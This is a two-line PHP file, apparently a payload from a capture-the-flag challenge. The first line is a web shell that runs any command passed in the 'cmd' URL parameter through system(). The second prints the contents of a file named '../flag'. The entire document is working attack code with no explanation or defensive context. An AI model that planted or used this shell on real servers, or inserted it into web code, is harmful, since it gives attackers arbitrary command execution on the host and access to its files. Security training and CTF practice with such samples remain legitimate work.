<?php echo 'EXEC CODE</br>'; system( $_GET['cmd']) ?>
<?php echo file_get_contents('../flag') ?>